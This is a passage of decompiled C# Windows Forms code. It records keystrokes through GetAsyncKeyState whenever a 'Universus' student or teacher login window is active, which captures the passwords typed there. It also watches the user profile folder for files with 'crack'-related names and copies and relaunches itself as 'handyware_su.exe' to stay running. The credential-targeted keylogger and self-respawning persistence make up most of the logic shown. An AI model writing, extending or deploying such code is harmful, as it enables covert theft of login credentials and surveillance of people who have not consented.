				else if (Contains(activeWindowTitle, "Universus", StringComparison.CurrentCultureIgnoreCase) && Contains(activeWindowTitle, "Login", StringComparison.CurrentCultureIgnoreCase) && (Contains(activeWindowTitle, "Student", StringComparison.CurrentCultureIgnoreCase) || Contains(activeWindowTitle, "Teacher", StringComparison.CurrentCultureIgnoreCase)))
				{
					flag = true;
				}
				if (flag)
				{
					if (logger == "")
					{
						logger = logger + "Window Title:  " + activeWindowTitle;
					}
					bool flag2 = false;
					for (int i = 0; i < 255; i++)
					{
						if (GetAsyncKeyState(i) == 0)
						{
							continue;
						}
						flag2 = true;
						if (keyDown)
						{
							continue;
						}
						keyDown = true;
						bool newLine = false;
						string keyPressed = GetKeyPressed(i, ref newLine, canRetShift);
						if (logger.IndexOf("\r\n") == -1)
						{
							logger += "\r\n";
						}
						if (newLine)
						{
							if (keyPressed != "<Left-Click>" || keyPressed != "<Right-Click>")
							{
								logger += keyPressed;
							}
							logger += "\r\n";
						}
						else
						{
							logger += keyPressed;
						}
						if (!(keyPressed != "<Shift>"))
						{
							canRetShift = false;
							flag2 = false;
							continue;
						}
						canRetShift = true;
						break;
					}
					if (!flag2)
					{
						keyDown = false;
					}
				}
			}
		}
		catch (SystemException ex)
		{
			writeLogError("Timer Log\r\nError: " + ex.Message);
		}
		timer_logger.set_Interval(30);
		timer_logger.set_Enabled(true);
	}

	private void checkBoxNotification_CheckedChanged(object sender, EventArgs e)
	{
		((Form)this).set_Size(new Size(((Control)label_mex).get_Size().Width + 24, ((Control)label_mex).get_Size().Height + 38));
		((Control)label_mex).Focus();
		if (chbxNotificationShowHide.get_Checked())
		{
			((Form)this).set_Location(new Point(-((Form)this).get_Size().Width, 2));
			((Control)this).Show();
			timer_showNotify.set_Interval(30);
			timer_hideNotify.set_Enabled(false);
			timer_showNotify.set_Enabled(true);
		}
		else
		{
			timer_hideNotify.set_Interval(10000);
			timer_hideNotify.set_Enabled(true);
			timer_showNotify.set_Enabled(false);
		}
	}

	private void timer_showNotify_Tick(object sender, EventArgs e)
	{
		if (((Form)this).get_Opacity() < 1.0 || ((Form)this).get_Location().X < 0)
		{
			if (((Form)this).get_Opacity() < 1.0)
			{
				((Form)this).set_Opacity(((Form)this).get_Opacity() + 0.05);
			}
			if (((Form)this).get_Location().X < 0)
			{
				((Form)this).set_Location(new Point(((Form)this).get_Location().X + 10, ((Form)this).get_Location().Y));
			}
		}
		else
		{
			chbxNotificationShowHide.set_Checked(false);
		}
	}

	private void timer_hideNotify_Tick(object sender, EventArgs e)
	{
		if (((Form)this).get_Location().X > -((Form)this).get_Size().Width)
		{
			timer_hideNotify.set_Interval(30);
			((Form)this).set_Location(new Point(((Form)this).get_Location().X - 10, ((Form)this).get_Location().Y));
			if (((Form)this).get_Location().X <= 0)
			{
				((Form)this).set_Opacity(((Form)this).get_Opacity() - 0.05);
			}
		}
		else
		{
			((Form)this).set_Opacity(0.0);
			((Control)this).Hide();
			timer_hideNotify.set_Enabled(false);
			timer_notifyFilaEspera.set_Enabled(true);
		}
	}

	private void button_ideMex_Click(object sender, EventArgs e)
	{
		timer_hideNotify.set_Interval(30);
		try
		{
			Process.Start(((Control)label_mex).get_Tag().ToString());
		}
		catch
		{
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void Form1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		difX = Cursor.get_Position().X - ((Form)this).get_Location().X;
		difY = Cursor.get_Position().Y - ((Form)this).get_Location().Y;
	}

	private void label_mex_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		difX = Cursor.get_Position().X - ((Form)this).get_Location().X;
		difY = Cursor.get_Position().Y - ((Form)this).get_Location().Y;
	}

	private void Form1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void label_mex_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void Form1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(Cursor.get_Position().X - difX, Cursor.get_Position().Y - difY));
		}
	}

	private void label_mex_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).set_Location(new Point(Cursor.get_Position().X - difX, Cursor.get_Position().Y - difY));
		}
	}

	private void fileSystemWatcher_userProfileFolder_Created(object sender, FileSystemEventArgs e)
	{
		bool flag = false;
		FileInfo fileInfo = new FileInfo(e.FullPath);
		if (fileInfo.Exists)
		{
			foreach (string item in palavrasChaveCrack)
			{
				if (Contains(fileInfo.Name, item, StringComparison.CurrentCultureIgnoreCase))
				{
					lstNotifications.Insert(0, "Founded a possible illegal file: \r\n...\\" + fileInfo.Directory!.Name + "\\" + fileInfo.Name + "|" + fileInfo.DirectoryName);
					flag = true;
					break;
				}
			}
		}
		if (flag || !fileInfo.Directory!.Exists)
		{
			return;
		}
		foreach (string item2 in palavrasChaveCrack)
		{
			if (Contains(fileInfo.Directory!.Name, item2, StringComparison.CurrentCultureIgnoreCase))
			{
				lstNotifications.Insert(0, "Founded a possible illegal files in: \r\n" + fileInfo.DirectoryName + "|" + fileInfo.DirectoryName);
				break;
			}
		}
	}

	private void timer_guardadinhoCheck_Tick(object sender, EventArgs e)
	{
		if (timer_guardadinhoCheck.get_Tag().ToString() == "")
		{
			timer_guardadinhoCheck.set_Tag((object)"ok");
		}
		else
		{
			if (!(timer_guardadinhoCheck.get_Tag().ToString() == "ok"))
			{
				return;
			}
			timer_guardadinhoCheck.set_Enabled(false);
			if (!existProcess("handyware_su"))
			{
				try
				{
					File.Copy(Application.get_ExecutablePath(), workspace + "\\handyware_su.exe", overwrite: true);
				}
				catch
				{
				}
				try
				{
					Process.Start(workspace + "\\handyware_su.exe");
				}
				catch
				{
				}
			}
			timer_CloseHandyware.set_Enabled(true);
		}
	}
}
